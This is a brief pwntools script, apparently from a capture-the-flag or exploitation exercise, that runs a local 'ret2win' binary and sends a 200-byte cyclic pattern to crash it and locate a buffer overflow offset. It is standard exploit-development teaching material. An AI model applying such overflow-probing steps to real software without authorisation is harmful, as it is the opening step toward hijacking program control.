from pwn import *

p = process("./ret2win")
pattern = cyclic(200)           # 200-byte unique pattern
p.sendline(pattern)
p.wait()                        # wait for crash
